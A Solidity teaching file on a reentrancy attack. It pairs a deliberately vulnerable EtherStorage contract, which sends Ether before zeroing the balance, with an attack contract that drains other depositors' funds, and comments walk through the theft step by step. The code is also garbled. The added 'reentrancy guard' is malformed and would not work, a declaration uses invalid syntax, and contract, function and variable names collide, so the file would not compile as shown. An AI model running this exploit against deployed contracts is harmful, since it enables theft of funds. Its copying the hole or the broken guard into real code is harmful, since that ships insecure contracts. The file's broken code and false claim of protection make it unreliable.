// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/*
EtherStorage is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy Reentrancy.
Let's see why.

1. Deploy EtherStorage
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStorage
3. Deploy Reentrancy with address of EtherStorage
4. Call Reentrancy.Reentrancy sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Reentrancy was able to call EtherStorage.withdraw multiple times before
EtherStorage.withdraw finished executing.

Here is how the functions were called
- Reentrancy.Reentrancy
- EtherStorage.deposit
- EtherStorage.withdraw
- Reentrancy fallback (receives 1 Ether)
- EtherStorage.withdraw
- Reentrancy.fallback (receives 1 Ether)
- EtherStorage.withdraw
- Reentrancy fallback (receives 1 Ether)
*/

contract EtherStorage {

    bool Internal mutex; // we need it for our reentrancy protection
    modifier reentrancyguard(){

    require(!mutex, "Do not even thing about it :-)");
    mutex = true;
    ;
    mutex= false;
    }


    
    mapping(address => uint) public balances;

    

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public reentrancyguard{
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Reentrancy {
    EtherStorage public EtherStorage;

    constructor(address _EtherStorageAddress) {
        EtherStorage = EtherStorage(_EtherStorageAddress);
    }

    // Fallback is called when EtherStorage sends Ether to this contract.
    fallback() external payable {
        if (address(EtherStorage).balance >= 1 ether) {
            EtherStorage.withdraw();
        }
    }

    function Reentrancy() external payable {
        require(msg.value >= 1 ether);
        EtherStorage.deposit{value: 1 ether}();
        EtherStorage.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
